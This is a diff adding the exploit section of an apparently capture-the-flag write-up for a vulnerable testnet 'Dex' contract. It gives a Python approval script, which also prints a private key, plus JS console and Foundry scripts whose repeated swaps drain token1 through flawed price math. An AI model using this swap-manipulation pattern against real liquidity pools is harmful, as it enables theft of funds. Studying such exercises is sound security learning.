@@ -185,5 +185,85 @@ This means that in the final step if we need to drain 110 token1, the amount of 
 ---
 ## The Exploit
 
-Let's take a look at our exploit script:
+At first we need to approve DEX to spend (swap) our tokens: 
 
+```Python
+import web3, json
+
+ABI = json.load(open('abi.json'))
+
+
+def approve(token, spender_address, wallet_address, private_key):
+  w3 = web3.Web3(web3.Web3.HTTPProvider("https://ethereum-goerli.publicnode.com"))
+  spender = spender_address
+  max_amount = w3.to_wei(2**64-1,'ether')
+  nonce = w3.eth.get_transaction_count(wallet_address)
+  print(nonce)
+  token  = w3.eth.contract(address=token, abi=ABI)
+  #token = w3.(token)
+  tx = token.functions.approve(spender, max_amount).build_transaction({
+      'from': wallet_address,
+      'nonce': nonce
+      })
+
+  signed_tx = w3.eth.account.sign_transaction(tx, private_key)
+  tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+
+  return w3.to_hex(tx_hash)
+
+with open("private_key_dead_one.txt", "r") as f:
+    p_key = f.readline()
+    print(p_key)
+
+print(approve(
+ token = "0x92631a3E7fe6b26FCd2539D7a02aE4a8E884D142",
+ spender_address = "0x6E1Ba44eFE73cE384C4E8350932cc08586C230A1",
+ wallet_address = "0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5",
+ private_key = p_key
+))
+```
+
+where `spender_address` is instance address and `token` - both tokens. make sure, that nonce changed between transactions. 
+
+After it we have 2 ways:
+1) using js console:
+```js
+await contract.approve(player, 500)
+token1 = await contract.token1()
+token2 = await contract.token2()
+await contract.swap(token1, token2, 10)
+await contract.swap(token2, token1, 20)
+await contract.swap(token1, token2, 24)
+await contract.swap(token2, token1, 30)
+await contract.swap(token1, token2, 41)
+await contract.swap(token2, token1, 45)
+```
+2) using foundry:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Script.sol";
+import "../instances/Ilevel22.sol";
+
+contract POC is Script {
+
+    Dex level22 = Dex(0x84c765cfdbA36b9e81Db0eb7C9356eed77296ed6);
+    function run() external{
+        vm.startBroadcast();
+        level22.approve(address(level22), 500);
+        address token1 = level22.token1();
+        address token2 = level22.token2();
+
+        level22.swap(token1, token2, 10);
+        level22.swap(token2, token1, 20);
+        level22.swap(token1, token2, 24);
+        level22.swap(token2, token1, 30);
+        level22.swap(token1, token2, 41);
+        level22.swap(token2, token1, 45);
+
+        console.log("Final token1 balance of Dex is : ", level22.balanceOf(token1, address(level22)));
+        vm.stopBroadcast();
+    }
+}
+```
